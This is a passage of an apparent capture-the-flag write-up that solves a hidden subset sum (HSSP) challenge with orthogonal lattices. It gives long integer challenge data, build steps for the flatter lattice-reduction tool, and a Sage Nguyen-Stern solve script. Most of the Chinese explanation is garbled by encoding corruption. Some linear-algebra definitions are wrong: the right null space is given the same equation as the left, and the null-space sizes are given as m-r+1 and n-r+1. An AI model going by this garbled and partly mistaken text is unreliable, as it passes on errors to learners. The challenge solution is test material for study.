13085724187735251902990250756196209600908652053725281294139610919151379144531851103633380912533710102796299853358725400239404987942390816511761529807030939893292168306351094697881403177421950694992263386572648775597583744415784239571, 7100689265695650020381992634740648600984998939714583113848881850701106459614914817851311196581107346332066792064189719153254177748385971715393193581611667136269465698799421805822480100454812068626009149069638986161533799798537549504, 4467099588802620474242283665232546701197788121100881304650783900944358367934303538647332945119694362849091301355005436291078223280753310654713741596387831313076907729367513905299597582977894859084467382251110232442313588731567517722, 5473046296972118327495477534670327059922805992783858593704621531789283121351554409848948934507912406403962506436068909023098369828879491079777608783858939477692990976926108359125684410236904067532064874993279097186185155662101906258, 13591367045303817756921606989622272393926672486200768156018816106702906007663207108105253090224421463114966486892454772900918694500736413865138170304122425783415795355698366106633741954984452451151018930441346568620455282531777867950, 12837435207992697390990569032560187426481997222586386722777778699242138971828789676884863577995903428553893241998604229610814215105950418432582043279620338868532002049158799146484208974875466555076583060832418045530228962180626040480, 7316640175294137713314869727957150382096738798129711776743606346914726499175960701433782404417244551378443800105185050713536694756151112399465628411989410218214135853671061537891268154389537857467508049690878544281069813159134447208, 5151376884557358987102680932801796401429637582605742653829100435795121709703076330975777361528309737649265350014534395043422641886613936452263244119523616000835976669901180725907500239783554884160601160568746329677044574260523365548, 5544576622940386549335576865087877596617926099466042134500548634035376720895126959440244093852186422501431889949044217654362265128303553015621478863491100875988057958166746762260378217552569885430432535094758534858841379918068187007, 14799083878004905781143009556442469081112262413659889639288955718256084634190461545010854679353463115437573577978160713007284612958005397981521383647283702964407693130299777274799243953236030640570493768398572551239990227306733506160, 132844788313325827023495191003662944917431930932901448945118978538428738126330451739237066558502122063099809045229187297346109539648216961234175022847902983869276754945800449898074085412283494856067025963252580204722767954611258179, 9997725379291207116745319316287400946107564644091980910563413554119585263470477093970564227161564056288461504072778119028907789906500076760472149102049287538406258735529830965640424425566731939511108199132607994947515509428756592559, 14646376958061531925518831995658673407931262101501970446265549357832773749183019186120219286620900718201222809743448147362429133751090137661872964022623647740154174784462365444772177633656555414706757146904500779085225231797377050144, 16961346690251629621986345424487239681148326635080182277543308482323385918405862092823934592459138523058683934777987371593649364181974320355468882733898473293716092586268920136699107300230769779047091693711423641803330962855097096925, 2618594245402239609420638325588710628729298505557767536783081437084561636188823448848608313088279895767614513680617644960939796227640357345879653043764575378231433481016175403223796690453962090038403036583909367766156025584252164203, 16129071855649587728956130797915283397821444682369014639788931828703405001025452386772618008541361124591860437269977673096643234091339097919538256670714042876788038021148787313041232229195101391115617710413115586617903468179658293636, 9296460193370583816070265591004199836116409032475859821958373154648206416256688852532615798871909770401306092671009539709487113538354105710364096048695663733075506988691991440779198012260316123759636997605427235081435477049705160552, 1356766159480311231046092117641588893355352105595481615726950290176811339998878309107970938869998059989877968402614403581962019949583734460209881480875822282448127936842922015950977040552638984243226561237288675211033594559512352433, 19197695297715405687227248527900901092786200526800375602428770624109373871809940359427277921210632597272639018938714964263079621574904896862536158251668755864087715415463131002786745060027810126535070270462254705453473599741763642828, 11504919294119244522634617029097854228866432223952020614427505589799731544252763714133524362716131837287869956783968056158486948361614604723869397483955281379172665969413312233383788159684735115665749332738234882920695449340309379522, 18136748881313347797489256490303008973958797121502583070872297973410283357173931060145003395290313809639159364452878423212404968100529416632370960280991488248897643385077173546644657216962479904853980225967792378564740955618790869689, 22555443333166977522691347301347007560400051480503434282172981846969595435546624498334336147388425749569732805395419970503066627849315134643618856767862223712319227590572187001545137380352712433069385477809940371396279834624165048444, 19332410102472644041731759226399070707013106727087481077728390364392367890410961009071561108596168685943298518353047413086954964804844094391018967334543408778135737715163542892702469367908397906585577557910294555212057020330243744038, 17177417284468945229490862308619539417109492506914913062877431832846296734201442477935598961820079857431068892933310664489209467455843404117024994948398426037991145460135427180175565761835499766689618253941365562391662494080561342044, 879611534766674063001632328710680301710464497091520920338941691285492779988149399177086528073474651179894297281827841186309099576047175634809922453338033325127493237666384356566986210156156953604218009901589731044248652021118031620, 23901207038202622707599557245612794049853792927287360450027492049407851837113641371314557090659548570609882944974639719117613653182109642059819516444307658547936689472901123537159776992389462316392381501838566991389570490374017025518, 7294655103119575652652322286451546582028529239995283561722077129773315845389577738996103704019032108880990669128684769525902413906863125164280686381766699292160785541839733876768365575818004233647829515890263347139003166333882303265, 8199949148068603717078157517861527127346508355755818050198576663971835822831527608360661637977726638149791394376076411543777469889828576151097728735193348069053034445800818498132875303434000618724830859612380606691308333135184789022, 12932127055873709636118977200718753643697619875736929170699115793566554057840448101626698069421491300195262169693063575726920790612681778762496689371363586507749098405216335541209813518577176560833970043581650697105699549343835699165, 9917293893368177421397475427602509319278773672321383411846980082270699518174858223780569843589979834443168760567064326549648560205061679870738748816216468066517782541276129041173215780179108422815701857032247139868407259633376154559, 6485828831888305306081814677813540588127941945945034779245913009780868830245510314875533356179894354966906340154886875373143060627077170845158967404313883218225671724777853809740370308868692781589580666606866945869996719967294318732, 19119951246631217104039346142695133667127595492295413599863780403588391811741379549048868909966290463800864082020118315313386877862668618823502190910178365164478013264098319748585627290011516370646420391829298524728641913535537536764, 13215772369693604102761934975932281069170694713655356522695565074039936506383846119163879883348265869353744569056003177315023138985010016601208933546975222998897707503967398686672700803569601825514347043442257463097499547507964305449, 1824804736849693701490461807874708098331129810367417218087931080176315035870555627969047286436604549231593492189121553958901210913466534815129733115561941853007429568739121822292088591127010504328963864942012956577043433126898293277, 6776240363305734174388141780584391816477723528084755437932934198907331150157541368203589425111306785868566064140117304971940704620271781717831300158164114203169466745769627304177491937036545708540956189334174616021603617610568750468)<br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong></p><p><strong>å‚è€ƒï¼š</strong></p><p><a href="https://0xffff.one/d/2077">HSSPä¸æ­£äº¤æ ¼å­¦ä¹ ç¬”è®° - 0xFFFF</a></p><p><a href="https://huangx607087.online/2025/02/21/Hgame25/#6-SPiCa-8pts-21sol">Hgame25 - huangx607087â€™s Blog</a></p><p><strong>HSSPé—®é¢˜ï¼š</strong></p><p>$A\vec{x}\equiv\vec{b}\mod pï¼Œå·²çŸ¥\vec{b}å’Œpï¼Œè€ŒAï¼ˆ0,1çŸ©é˜µï¼‰å’Œ\vec{x}ï¼ˆå‘é‡ï¼‰æœªçŸ¥ã€‚$</p><p><strong>å››å¤§åŸºæœ¬å­ç©ºé—´ï¼š</strong></p><ul><li><p><strong>è¡Œç©ºé—´ï¼š</strong> $A\vec{x}&#x3D;\vec{b}$ä¸­ï¼Œæ‰€æœ‰$\vec{b}$æ„æˆçš„ç©ºé—´ï¼Œæ­¤æ—¶Açš„æ¯ä¸€è¡Œæ„æˆç©ºé—´çš„åŸºåº•å‘é‡ã€‚</p></li><li><p><strong>åˆ—ç©ºé—´ï¼š</strong> A$\vec{x}&#x3D;\vec{b}$ä¸­ï¼Œæ‰€æœ‰$\vec{b}$æ„æˆçš„ç©ºé—´ï¼Œæ­¤æ—¶Açš„æ¯ä¸€åˆ—æ„æˆç©ºé—´çš„åŸºåº•å‘é‡ã€‚</p></li><li><p><strong>å·¦0ç©ºé—´ï¼š</strong> æ»¡è¶³$\vec{x}A&#x3D;\vec{0}$çš„æ‰€æœ‰$\vec{x}$æ„æˆçš„é›†åˆï¼Œåœ¨sagemathä¸­ä¸ºÂ <code>A.left_kernel().matrix()</code>ã€‚å…¶ä¸ªæ•°ä¸ºm-r+1ï¼Œrä¸ºAä¸­äº’ç›¸çº¿æ€§æ— å…³çš„è¡Œå‘é‡ä¸ªæ•°ã€‚</p></li><li><p><strong>å³0ç©ºé—´ï¼š</strong> æ»¡è¶³$\vec{x}A&#x3D;\vec{0}$çš„æ‰€æœ‰$\vec{x}$æ„æˆçš„é›†åˆï¼Œåœ¨sagemathä¸­ä¸ºÂ <code>A.right_kernel().matrix()</code>ã€‚å…¶ä¸ªæ•°ä¸ºn-r+1ï¼Œrä¸ºAä¸­äº’ç›¸çº¿æ€§æ— å…³çš„åˆ—å‘é‡ä¸ªæ•°ã€‚</p></li></ul><blockquote><p><strong>æ€§è´¨ï¼š</strong> <strong>è¡Œç©ºé—´</strong>å’Œ<strong>å³0ç©ºé—´</strong>æ­£äº¤ï¼Œ<strong>åˆ—ç©ºé—´</strong>å’Œ<strong>å·¦0ç©ºé—´</strong>æ­£äº¤ã€‚</p></blockquote><p><strong>é—®é¢˜è§£æ³•ï¼š</strong></p><ul><li><p>å¯¹å·²çŸ¥ç»™å®šçš„å‘é‡$\vec{h} \mod Mï¼Œ$é¦–å…ˆæ‰¾ä¸$\vec{h}$å‚ç›´çš„m-nä¸ªçŸ­å‘é‡$\vec{\mu_i}$</p></li><li><p>ä½¿ç”¨$\mu_i$æ„é€ æ ¼$L_{\frac{1}{x}}$ï¼Œç”¨$L_{\frac{1}{x}}$æ‰¾åˆ°$L_x$çš„æ­£äº¤è¡¥$\overline{L_x}$</p></li><li><p>å¯¹$\overline{L_x}$ä½¿ç”¨BKZæ¢å¤$x_i$</p></li></ul><blockquote><p><strong>é™„ä¸ŠArch Linuxä¸­å®‰è£…flatterï¼ˆåŠ é€Ÿæ ¼è§„çº¦ï¼‰æ­¥éª¤ï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> pacman -S gmp mpfr eigen base-devel gcc git cmake<br>git <span class="hljs-built_in">clone</span> https://github.com/keeganryan/flatter.git<br><span class="hljs-built_in">cd</span> flatter<br><span class="hljs-built_in">mkdir</span> build &amp;&amp; <span class="hljs-built_in">cd</span> ./build<br>cmake -DCMAKE_INSTALL_PREFIX=/usr ..<br>make<br><span class="hljs-built_in">sudo</span> make install<br></code></pre></td></tr></table></figure></blockquote><p><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-comment">#æ­£äº¤æ ¼</span><br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>logging.basicConfig(<br>    level=logging.DEBUG,<br>    <span class="hljs-built_in">format</span>=<span class="hljs-string">&quot;[%(levelname)s] %(message)s&quot;</span><br>)<br><br><span class="hljs-comment"># https://github.com/Neobeo/HackTM2023/blob/main/solve420.sage</span><br><span class="hljs-comment"># faster LLL reduction to replace `M.LLL()` wiith `flatter(M)`</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flatter</span>(<span class="hljs-params">M, **kwds</span>):<br>    <span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> check_output<br>    <span class="hljs-keyword">from</span> re <span class="hljs-keyword">import</span> findall<br>    M = matrix(ZZ,M)<br>    <span class="hljs-comment"># compile https://github.com/keeganryan/flatter and put it in [imath:0]PATH</span><br>    z = <span class="hljs-string">&#x27;[[&#x27;</span> + <span class="hljs-string">&#x27;]\n[&#x27;</span>.join(<span class="hljs-string">&#x27; &#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>,row)) <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> M) + <span class="hljs-string">&#x27;]]&#x27;</span><br>    ret = check_output([<span class="hljs-string">&quot;flatter&quot;</span>], <span class="hljs-built_in">input</span>=z.encode())<br>    <span class="hljs-keyword">return</span> matrix(M.nrows(), M.ncols(), <span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>,findall(<span class="hljs-string">b&#x27;-?\\d+&#x27;</span>, ret)))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkMatrix</span>(<span class="hljs-params">M, wl=[-<span class="hljs-number">1</span>, <span class="hljs-number">1</span>]</span>):<br>    M = [<span class="hljs-built_in">list</span>(_) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(M)]<br>    ml = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(flatten(M)))<br>    logging.debug(ml)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sorted</span>(ml) == <span class="hljs-built_in">sorted</span>(wl)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Nguyen_Stern</span>(<span class="hljs-params">h, m, n, M</span>):<br>    B = matrix(ZZ, m)<br>    B[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>] = M<br>    h0i = Integer(h[<span class="hljs-number">0</span>]).inverse_mod(M)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, m):<br>        B[i, <span class="hljs-number">0</span>] = - h[i] * h0i<br>        B[i, i] = <span class="hljs-number">1</span><br>    <span class="hljs-comment">#L = B.BKZ()    # slooooooow</span><br>    L = flatter(B)<br>    logging.info(<span class="hljs-string">&#x27;flatter done.&#x27;</span>)<br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    vh = vector(Zmod(M), h)</span><br><span class="hljs-string">    logging.debug([vector(Zmod(M), list(l)) * vh  for l in L])</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br>    Lxo = matrix(ZZ, L[:m-n])<br>    Lxc = Lxo.right_kernel(algorithm=<span class="hljs-string">&#x27;pari&#x27;</span>).matrix() <span class="hljs-comment"># faster</span><br>    logging.info(<span class="hljs-string">&#x27;right_kernel done.&#x27;</span>)<br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    try:</span><br><span class="hljs-string">        Lx_real = matrix(ZZ, [xi + [0] * (m - len(xi)) for xi in X])</span><br><span class="hljs-string">        rsc = Lxc.row_space()</span><br><span class="hljs-string">        logging.debug([xi in rsc for xi in Lx_real])</span><br><span class="hljs-string">    except:</span><br><span class="hljs-string">        pass</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br>    e = matrix(ZZ, [<span class="hljs-number">1</span>] * m)<br>    B = block_matrix([[-e], [<span class="hljs-number">2</span>*Lxc]])<br>    Lx = B.BKZ()<br>    logging.info(<span class="hljs-string">&#x27;BKZ done.&#x27;</span>)<br>    <span class="hljs-keyword">assert</span> checkMatrix(Lx)<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">set</span>(Lx[<span class="hljs-number">0</span>])) == <span class="hljs-number">1</span><br><br>    Lx = Lx[<span class="hljs-number">1</span>:]<br>    E = matrix(ZZ, [[<span class="hljs-number">1</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Lxc.ncols())] <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Lxc.nrows())])<br>    Lx = (Lx + E) / <span class="hljs-number">2</span><br><br>    Lx2 = []<br>    e = vector(ZZ, [<span class="hljs-number">1</span>] * m)<br>    rsc = Lxc.row_space()<br>    <span class="hljs-keyword">for</span> lx <span class="hljs-keyword">in</span> Lx:<br>        <span class="hljs-keyword">if</span> lx <span class="hljs-keyword">in</span> rsc:<br>            Lx2 += [lx]<br>            <span class="hljs-keyword">continue</span><br>        lx = e - lx<br>        <span class="hljs-keyword">if</span> lx <span class="hljs-keyword">in</span> rsc:<br>            Lx2 += [lx]<br>            <span class="hljs-keyword">continue</span><br>        logging.warning(<span class="hljs-string">&#x27;Something wrong?&#x27;</span>)<br>    Lx = matrix(Zmod(M), Lx2)<br><br>    vh = vector(Zmod(M), h)<br>    va = Lx.solve_left(vh)<br>    <span class="hljs-keyword">return</span> Lx, va<br><br>m = <span class="hljs-number">247</span><br>n = <span class="hljs-number">70</span><br>M = <span class="hljs-number">24727704801291912268835129736340977567569865784366882566681759917843647658060231409536848349518003784121914409876944135933654762801696486121844572452922377222301017649192408619831637530961997845860817966791811403512683444831050730277</span>  <span class="hljs-comment">#æ¨¡æ•°</span><br>h = (<span class="hljs-number">20469155492003601253253155553986803208931503654660710348720234166881649344003987262947017659012241047835048808070655285602897209239858740637878468266658899337230431317158339301884716019022543563824842749256770110913729930512649260804</span>, <span class="hljs-number">20061197539347089441548703718074268696982927733926399966893938885418017706383655096958576679109275153818455164325651467862757293092935593603331322600268652102317484783972009137643693799482954597365244794142123800753823881292602536480</span>, <span class="hljs-number">20449460766608148327819595887200586456206801278670684512632410913015490167503229582572274670752456522031099839096710051732743590814126659553219421423179332067697185796944680381658040503559588413035145948011713429631258754626251809510</span>, <span class="hljs-number">8694899395827009396141425992800033658778511870582271935710336140733986029271840480988700276909069199154936459475590420059851372448080387583101099303513327440738409895238607476203278712316251695883695113189088200686962847017765865251</span>, <span class="hljs-number">17498906738048927737996405866022970301450352038432120213930838838210038594926299429345553642022023354628862755091766856471553830387207275486875845428629363403317202957206875712023311105409026776222751170693634497194866213310044491948</span>, <span class="hljs-number">21299762658878585689792741107233334119508283391034542047533549461069861697448477916998731369486958411519583373650555867155855962437320409451328328158651213135213221691391305300586647640883613895924445303848945011091274872544725674414</span>, <span class="hljs-number">13858127090108368287746753156610976181884852029313352847097417269439999009242391680724254761571841185603751824488440165104153860614293879561204207753769517496283139692448618313378608851838592204671380865578837501521485226960295757131</span>, <span class="hljs-number">606107901015597672365982103377292862084693785965621044158858796689187941648736569096576321682310287031175045717941165527209428043020224184139162372752993919547870816012630061403517257290792929118011920477984972488980800309428929138</span>, <span class="hljs-number">16411347559169875469676322308290176281268630976465248631394286269278754960475346068565041099592979349979405282500383230219337689652572250821233598049978719348544790979587439571926076421698781802827344619141310395216702580071924399522</span>, <span class="hljs-number">6068129514673183503857587322729184998437772152551135658369680702133087671031996497962264049216246290631119377494262423727768860757742407967523061034172791840869912562774945606863954031992955819024967183759253919768822212999747782744</span>, <span class="hljs-number">16164073883659743891300469301841345466013040331496294498459841128458772221808605865298982279094019325297165362518613472961615756988375470180863560145427159107654477630571820179272488975849163426474631458599008988483395281798203200528</span>, <span class="hljs-number">6002652834833034433754084876025091748505356485760658745433173659340361267044983148952514860044218624345794714339893198968695437915359546317081144940354972707822464098838782671025813140852500245911841467802762732970205945777188441808</span>, <span class="hljs-number">17671459116121703756342696273829703490771262874572413082113674648287158047430332224637950989312667436860899021459708831070319841598164702019251450606454194564607879044661224315550514675652908609424461409598055757760711713272045049260</span>, <span class="hljs-number">9747804618981818225871997793952044666360767497788933437958387359050267555950930083105832397549316456989456304967283430526550121320745106610566272812291168897483422111931300711618308924263505765555678625775964949832562993340397250411</span>, <span class="hljs-number">21996324872073077242827998678880398901946388402016282475335311894567710762615152283467554531548297081386048827720410652120091647717684967177129064563480634873781425892452230881151261828547497099982851340353851101348946158575303726724</span>, <span class="hljs-number">20241128353291496652549108347619870477868850796680814076775175545760753973504668850036916374732720117160823389137853705825323283084380525440155558201212646427779126805749122859405488144164760267716232853839558997235342814050866837305</span>, <span class="hljs-number">13077656588899945700177181105263191868661064142860342679420184386239288545559858208951244435002966218243471420411045127025170552814160049125443370520964733258446212562129228879028530411822623695945498142516847896364762727423847457569</span>, <span class="hljs-number">7071530328065960890228453106008174199753371584339217118863740503556709237910489181283781927314970563878932442685277071347084354303239011911501455742585794028015220762730525765723336697380407902300153076264167533419216642860030224808</span>, <span class="hljs-number">22629252419865938253406009966521328587876533319128691562733593432194850726544929405088413178711982271889635298452313176698526192124305038839672198237812975135604141185210235559237447902236397265515318102940456244538398518752792480319</span>, <span class="hljs-number">5761459282176273118441944774799317407926062706007941700537400300748276958322349624237180755323800649847915919270480127859496807988229286598479624333300775674629423967322510405098758253061619727977005010935095672626407042895060271117</span>, <span class="hljs-number">13639378161376676791792650903794774452153629456935313476059754419699524574293526097694165098576687387486041665215960405733414879557245739928959501291435121608217008600392918108625339394853036499361173570509333162629246799468258136355</span>, <span class="hljs-number">1112221399019911081496513796105161716836267107501837651409516901292548472550496647130548616639784532217354650999157000279855022754714713097738729659495163953274484703014544784112610298442477231451271844048275322265529309125867188484</span>, <span class="hljs-number">12169161457053461668887038869671670176419946971662802953933166632081503259881448728851846332111194017082971192703865066066994163285010795828715477686499512514182295671281701232618183396077110570747529444745554508737426539555889099083</span>, <span class="hljs-number">11995511934849768905988062930456188671563166274831822681485210668895901448904842487096473591287554694509756168119490699415704136424403683840102743199694489304702405180406601329931714339410923612708808717358223085506757046662329629503</span>, <span class="hljs-number">13398528474737208001694948941230339341569100018647773619061861109738576104252100110443962069174319732180553417809151715735410100005179978063724591835291397314433312440421293983105825390167635459002960994550698739443052006993415149287</span>, <span class="hljs-number">21685721078976945602014626559051952462522937081933691461596237088189849657600841978193227429482306484131038624804443150311960061590035031144063153270840224125769186685588909207004132946200580900994078282900107456593588235003169921354</span>, <span class="hljs-number">21958932659990459795087732047584541007461325015275566949343681883128871386631056478783893068511478481080998508038344707524693059394150326940234855081823341566958854943322931261168562807321821084640569487228751077318094170704981650643</span>, <span class="hljs-number">18575326074968673858478938102428524301651676277226235867758079277741745360252102636120213638047957826270155136845469846718570511376252915803608625919614831191687134838436838444619000754054647327991321858217571418142823485948838843485</span>, <span class="hljs-number">21925408319719932198647415634718243407859189936679904356040860926584581042313625039619815019247876519120113207553707089727019778893587018690751305364116444902853587524322159019276550794203235986634843194549273092242442491313448819261</span>, <span class="hljs-number">21971769237171245388162249651275023141695912811218668240216220140957909617367793495291879198350993947099136765615466319867553659408044799043226321654345805093608432328775587162697826122051456089057951721736470156996789589476553105264</span>, <span class="hljs-number">11663665652950097951023874167071177053010440547278309973779798672676245675511213044752231769369800098096803991421401406373428185323198016967614776368177594490205473987491609921616943160817435319509156480489438442748695594208064506220</span>, <span class="hljs-number">8571733767532539591744305084238785438241372113715037973018068103542160069189369810177762541226540971969214853589594936813485292570840550755458909361226931687465304387382031888400449142008298116395068621612620111710861173184866936140</span>, <span class="hljs-number">7265641014493092305952899792692591083374900624337072072988050601814681241595404157641546803250164823540836286168102490427911208624069282838605171970733970339707601992725288390921333947799040016958678972693235850470014270495531454783</span>, <span class="hljs-number">18357683019971557309259589537387305852885630835264669230196131340413934504145103735168294472683744065174013315114812930463567210171038311927245433959034948205776155437226711665133074869096527958147737755278545942090787842643719386293</span>, <span class="hljs-number">11249630823936690987701184435328330983163223168635101989339377911187086984695870497253721111980469167097885275676200751043669504762094425614665999696903436973710297025883232331081137662411660725420763463582758176584701928482618894781</span>, <span class="hljs-number">21368417704130086095517329969849814675572842583190085389984103090985523417424304950647847490274582711171880575904265538743919551938416088883734546870704471113682032872096669715559005389583617506786922899538736534449123490145292870717</span>, <span class="hljs-number">14804820832711028510069420293910842363490984270818804823036282440726358025681287768311485300453811070788732988003156703771994750175077965636968452087698951366737342420716417627361539128824909909441296599842507450408639167847785653915</span>, <span class="hljs-number">10434593401661546638239269531721470859924069355256379358171970711096840647467279929406877589003350835919284031476862418858161422460097377292030151489346187334893502923880428533662123412400043690091517722265611541955158862687687083713</span>, <span class="hljs-number">24561443937015608720032402685089937637576551127866411331840220467266147984636152386876296689017192384827778734671122241130228223938051376943961096583907106197792850273311466092875658575488249813416281385686228639897799476137433072794</span>, <span class="hljs-number">18809508978562914770986641825424844673983326011247074637810890215219273029154108492496227431003955064765815763011903046546663244351135252376892253084070542641533081339319510865846592705413531461782231583683139065833462426977193323114</span>, <span class="hljs-number">1170325200926282785717575909542245218787696779459745550244912972650806869414330169502410895858680097983058617766512675739980564138645468322689195204967563486996177593733827238558844633804910336361508567070012845430162557209140318922</span>, <span class="hljs-number">9099530973344423583417798796448265698513331818761124724904157320649249490671748034442773080315290728734123593584766820587431677397350547048991745367397003023697063690573732401873466117208072387527262379544046633911232863713321651057</span>, <span class="hljs-number">6186545629812301877416853524734068114160450574994337117451587850263036761908385044092582990344042147406495912347645194115630652437606943173745789382845771049426443196019424697520894541338185145315971072044570777761063733877553713897</span>, <span class="hljs-number">18998733646999927412724741294417250892695086218116871981646202453146130670287277614970454171035798941213673467661889691048080971104465387696449499673490777958698659977825222598637449610957807490964624239691466685216040180063226979122</span>, <span class="hljs-number">2029035413823102082844939452656558074099805593476575872183225270283922006193130394920312821210960344438963206668816623318138806516660963226561860797911308864515985218753289984687939495010747187617345807068432674609822226022395002612</span>, <span class="hljs-number">1224334924830478941430540036421292246508644320238722677095883999889500298055876272715003687287887258419587507272093701524018402394087314059455381046013880303534485492492854314287356722191065404686438496257734600194353825409365914860</span>, <span class="hljs-number">15388830123476635874371535682309831543921413772062742670104698630978096538706065152811565310857194947646535508434358944071335015150277106407625487947363537743602712388716945337353159986787039117453435890006787376090096478885097896793</span>, <span class="hljs-number">10420053457335214342250034515332590797688043330675602278978659239127226996657084329075623919952172290482707420754415548245461942799120532008714972162634055331774926378534698291836555381029033314988303673575302329970048819875247229179</span>, <span class="hljs-number">12996570101872386881673806472032213506289839322758639432467242407197962401207255061640708238859358713382396645910306730272104173292864961862992132326434563495453537396958298185516874532647829493332700756725404634790257544413340701179</span>, <span class="hljs-number">11310001007421937130740204981515298136120181111962805563938085404289034278582061516301247258497064123414338657565189590291572623864937738084898059354622789358315367559028252287238789841719507080364615405563645390035528060316587102434</span>, <span class="hljs-number">7649920628929819175111413039486903286582015040923724934131761955991728816695088157076979052445031028120246103984026955901706105551535103282597498033031299709784514740469952209886314525277234547727841567842751063166501691717457807447</span>, <span class="hljs-number">8282767661876353703033480225670583969116738681062155629579190289397580081693316541581172493468366688140769336848827009811751348916039495262878858557738835369246631011150499694799485418164185557834866797870483707948444235231858169626</span>, <span class="hljs-number">10348065215991838887653401510489462098163485305574734545999066167894062235647455464256295931687781439097474305106334560598277885818537337701043155862614830925253569580192693898982318220593792046251125806231585329780902132617095557605</span>, <span class="hljs-number">11280967838102140047754377333560306350439648795137561969675963243081381329614099288939779782707558436465906221877404058208128414128559781592656246480955369758626788333375306898903783463959673000218175927160948442088191543414186131128</span>, <span class="hljs-number">11818929318729599124873943942145086021537273013997542692590943191077407938431043519607803418206555258214868688916182982805626078211252859082557253484889098137542929253460999852448424761935728458750150144937944771790308225982842690991</span>, <span class="hljs-number">5412969967721429139669566091956620099392941108847901064147423662180279827506836216754081912452764251675143575201910182189452840950356093575193249038624088662404268095962548749560674786705087512264668188729966989099888520624252744742</span>, <span class="hljs-number">17547356830409485892450749625199098509352498837601257846778404113094407637374346871392480581359187302653977880177675827091282945951962337410850311708191191160617963235512211658386260536823783677847875240999663432436509923589359888700</span>, <span class="hljs-number">8591887831833320840353196012263813111833998698446912587048628554388758958894496922493509033622609997670078612331200032453354380661501616871254995529921741954557910165239506265116743029658460390005477758921580324576966499950007047698</span>, <span class="hljs-number">24240608152025765890027400489331384103622640389639440068870645610439083379801706312111003846522258870692561041435455283169383633954853734692273153399247032151636823004018903792154640252253321042038217671452847628056591095001306376447</span>, <span class="hljs-number">18175238845322126323124732491839020080710712641999842067614816417084136046584647549081884372712146959940542383332663098640914320062272677772398521802893135140152503676658094543636706418059620569628737841646560680792630698212823857262</span>, <span class="hljs-number">10173862342693636575822816691492648273969020863129335004286001570695771568655492268044889845820019987659485915423299727906247618142386037838017456563194751538355466980296232841821674366111391576715244751705262011350337874749069345128</span>, <span class="hljs-number">17662887672308755659019635470333733858782416229711314422114693688837435216071004353298349767965595195988075045297248229654838457705997370106886962462023530886801849382037053188597909092732733084276903712706650614116210171460124448702</span>, <span class="hljs-number">12181524874770358579756085310138062154649043402053826988100381472344586613507823529632552464702544146652926312223695774383330894873770697330113566788363326971512196767946895811541430690548268356821209678371607727953997755838859126774</span>, <span 